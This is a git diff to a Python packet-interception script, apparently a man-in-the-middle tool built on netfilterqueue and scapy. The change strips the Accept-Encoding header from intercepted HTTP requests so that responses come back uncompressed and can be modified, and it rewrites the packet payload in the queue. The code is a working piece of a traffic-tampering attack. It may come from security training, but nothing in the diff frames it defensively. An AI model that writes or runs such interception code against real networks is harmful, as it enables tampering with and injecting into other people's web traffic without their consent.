@@ -1,6 +1,7 @@
 #!/usr/bin/env python
 import netfilterqueue
 import scapy.all as scapy
+import re as regex
 
 # Defining loader functionality
 def loader(packet, load):
@@ -17,7 +18,12 @@ def spoofed_packet(packets):
         # Destination Port
         if scapy_packet[scapy.TCP].dport == 80:
             print("[+] Request")
-            print(scapy_packet.show())
+            # Removing Accept-Encoding in the request using regex rules.
+            # The old packet will be returned as a string
+            # Thus it will decode the response into HTML code
+            old_packet = regex.sub("Accept-Encoding:.*?\\r\\n", "", scapy_packet[scapy.Raw].load)
+            new_packet = loader(scapy_packet, old_packet)
+            packets.set_payload(str(new_packet)) # change payload of the packet that we will accept to the new payload
         # Source Port
         elif scapy_packet[scapy.TCP].sport == 80:
             print("[+] Response")
